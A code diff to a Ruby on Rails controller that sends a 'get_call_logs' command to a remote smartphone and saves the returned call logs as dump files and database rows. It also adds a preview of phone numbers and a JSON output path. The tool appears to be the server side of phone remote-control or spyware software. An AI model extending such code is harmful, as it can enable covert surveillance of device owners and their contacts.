@@ -15,12 +15,14 @@ class CallLogsController < InheritedResources::Base
       pending_command = send_command_and_wait(@smartphone, 'get_call_logs', {}, timeout: 30.seconds)
       
       if pending_command.completed?
-        call_logs_data = pending_command.response_data
+        raw_data = pending_command.response_data
+        call_logs_data = raw_data['logs'] || raw_data['payload']&.dig('logs') || []
         
         # Save to file
         file_path = Rails.root.join('files', 'dumps', 'calllogs_dumps', @fileName)
         FileUtils.mkdir_p(File.dirname(file_path))
-        File.write(file_path, format_call_logs(call_logs_data))
+        formatted_content = format_call_logs(call_logs_data)
+        File.write(file_path, formatted_content)
         
         # Save to database
         CallLog.create!(
@@ -29,7 +31,9 @@ class CallLogsController < InheritedResources::Base
           smartphone_id: @smartphone.id
         )
         
-        commandOutput = ["Call logs dumped successfully: #{@fileName}"]
+        # Show first 20 logs in output
+        preview = call_logs_data.first(20).map { |l| "#{l['call_type']}: #{l['phone_number']} (#{l['duration']}s)" }
+        commandOutput = ["Call logs dumped successfully: #{@fileName}"] + preview
       else
         error_msg = pending_command.response_data&.dig('error') || 'Unknown error'
         commandOutput = ["Operation Failed: #{error_msg}"]
@@ -40,14 +44,22 @@ class CallLogsController < InheritedResources::Base
       commandOutput = ["Operation Failed: #{e.message}"]
     end
     
-    respond_to do |format|
-      format.js {
-        render "dump_calllogs", locals: { commandOutput: commandOutput, fileName: @fileName }
-      }
+    if want_json?
+      render json: { output: commandOutput, filename: @fileName }
+    else
+      respond_to do |format|
+        format.js {
+          render "dump_calllogs", locals: { commandOutput: commandOutput, fileName: @fileName }
+        }
+      end
     end
   end
 
   private
+
+  def want_json?
+    request.format.json? || request.headers['Accept']&.include?('application/json')
+  end
   
   def format_call_logs(call_logs_data)
     return "No call logs data" unless call_logs_data.is_a?(Array)
